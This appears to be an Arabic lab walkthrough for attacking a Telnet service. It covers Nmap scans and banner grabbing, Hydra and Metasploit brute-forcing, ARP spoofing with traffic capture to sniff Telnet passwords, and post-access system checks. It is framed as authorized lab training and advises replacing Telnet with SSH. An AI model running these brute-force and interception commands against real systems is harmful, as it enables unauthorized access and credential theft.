1. Reconnaissance

تأكد من واجهة الشبكة والهدف قبل فحص الخدمة

معرفة IP والواجهة KALI TERMINAL
ip a
احتفظ باسم الواجهة مثل tun0 أو eth0؛ ستحتاجه أيضًا لو كان اللاب فيه التقاط Traffic.
التأكد من الوصول للهدف KALI TERMINAL
ping -c 4 [TARGET]
إذا ICMP محجوب، انتقل مباشرة إلى Nmap مع -Pn.

2. Port Scanning

حدد هل Telnet موجود فعلًا وما هو البورت والإصدار/البانر الظاهر

فحص أولي للخدمات KALI TERMINAL
nmap -sS -sV [TARGET]
✓ ابحث عن سطر شبيه: 23/tcp open telnet
إذا لم يظهر 23 — فحص كل TCP ports KALI TERMINAL
nmap -p- --min-rate=1000 -T4 [TARGET]
بعد اكتشاف بورت غير قياسي، استخدم رقمه الفعلي في كل الأوامر التالية.
فحص مركّز للخدمة KALI TERMINAL
nmap -p23 -sV -sC [TARGET]
الهدف هنا تثبيت أن الخدمة Telnet ومحاولة أخذ أي Banner أو معلومات افتراضية من الـscripts.

3. Enumeration

اتصل بالخدمة يدويًا وشاهد الـbanner وطريقة طلب تسجيل الدخول

فتح اتصال Telnet يدوي KALI TERMINAL
telnet [TARGET] 23
✓ النتيجة المتوقعة غالبًا: Banner ثم login: / Username: حسب النظام
لو الخدمة على بورت مختلف: telnet [TARGET] [PORT].
Banner grab بديل KALI TERMINAL
nc -nv [TARGET] 23
مفيد إذا أردت فقط رؤية الرد الأولي بدون جلسة Telnet كاملة.

4. Credential Testing

إذا ظهر Login Prompt ولم تكن لديك بيانات — اختبر الاعتمادات فقط داخل اللاب/النطاق المصرح

Hydra — مستخدم واحد مع قائمة كلمات مرور KALI TERMINAL
hydra -l [USERNAME] -P [WORDLIST] telnet://[TARGET]
لو عندك قائمة مستخدمين: استبدل -l بـ -L [USERLIST].
Metasploit — Telnet Login Scanner MSFCONSOLE
use auxiliary/scanner/telnet/telnet_login set RHOSTS [TARGET] set USER_FILE [USERLIST] set PASS_FILE [WORDLIST] run
طريقة بديلة إذا كنت تعمل أصلًا داخل Metasploit.

5. Authenticated Service Access

تحذير: تأكد من الإصدار قبل أي exploit. إذا ما عندك تطابق واضح، لا تشغّل exploit عشوائي.

الوصول للخدمة يعتمد غالبًا على بيانات دخول صحيحة؛ لا تشغّل أي exploit إلا بعد التأكد من الإصدار ووجود مسار مناسب.

تسجيل الدخول TELNET CLIENT
telnet [TARGET] [PORT] # عند الطلب [USERNAME] [PASSWORD]
✓ النجاح = ظهور Shell/Prompt على الجهاز البعيد بدل إعادة طلب Login
تنبيه: Telnet لا يوفر تشفيرًا لحركة الجلسة مثل SSH؛ لذلك لا تستخدم بيانات حقيقية خارج بيئة لاب معزولة.

6. Post-Exploitation

بعد الوصول: تحقق من الجلسة، وانتبه أن Telnet ينقل البيانات بدون تشفير؛ خلك على الخطوات الفورية فقط.

ARP Spoofing + Packet Capture LAB / INTERNAL

تفعيل IP Forwarding KALI TERMINAL
echo 1 > /proc/sys/net/ipv4/ip_forward
وضع نفسك بين طرفي الاتصال KALI TERMINAL
arpspoof -i [INTERFACE] -t [CLIENT_IP] -r [SERVER_IP]
في هذا السيناريو يمكن استخدام eth1 مع عنوانَي العميل والخادم، ثم تم التقاط الترافيك على نفس الواجهة.
التقاط الترافيك WIRESHARK
Capture on: [INTERFACE] Display filter: telnet
✓ مؤشر النجاح: إذا كان العميل يستخدم Telnet يمكن التقاط كلمة المرور من الترافيك.
هذه النقطة هي سبب أمني مباشر لاستبدال Telnet بـSSH متى كان ذلك ممكنًا.
Linux — التحقق من المستخدم والنظام VICTIM SHELL LINUX
whoami id uname -a ip a
خطوات تحقق مباشرة؛ لا تعني أن جلسة Telnet تعطي صلاحيات مرتفعة تلقائيًا.
Windows — التحقق من المستخدم والنظام WINDOWS CMD WINDOWS
whoami hostname ipconfig
استخدم المسار المتوافق مع النظام الذي وصلت إليه.
